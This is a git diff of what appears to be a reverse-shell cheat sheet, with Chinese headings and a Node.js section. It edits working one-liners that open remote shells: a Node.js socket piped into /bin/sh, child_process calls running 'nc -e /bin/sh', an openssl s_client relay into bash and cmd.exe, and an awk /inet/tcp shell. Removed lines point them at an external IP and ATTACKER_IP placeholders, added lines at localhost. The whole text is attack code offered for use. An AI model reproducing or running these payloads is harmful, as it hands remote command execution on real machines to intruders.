@@ -188,7 +188,7 @@ Nodejs
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(8080, "10.17.26.64", function(){
+    client.connect(1234, "127.0.0.1", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -199,12 +199,12 @@ Nodejs
 
 or
 
-require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+require('child_process').exec('nc -e /bin/sh 127.0.0.1 1234')
 
 or
 
 -var x = global.process.mainModule.require
--x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
+-x('child_process').exec('nc 127.0.0.1 1234 -e /bin/bash')
 
 
 ```
@@ -225,11 +225,9 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo wil
 靶机
 
 ```bash
-#Linux
-openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 
-#Windows
-openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
+openssl s_client -quiet -connect 127.0.0.1:1234|/bin/bash|openssl s_client -quiet -connect 127.0.0.1:12345
+
 
 ```
 
@@ -238,7 +236,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 ```bash
 
-awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 
 ```
 
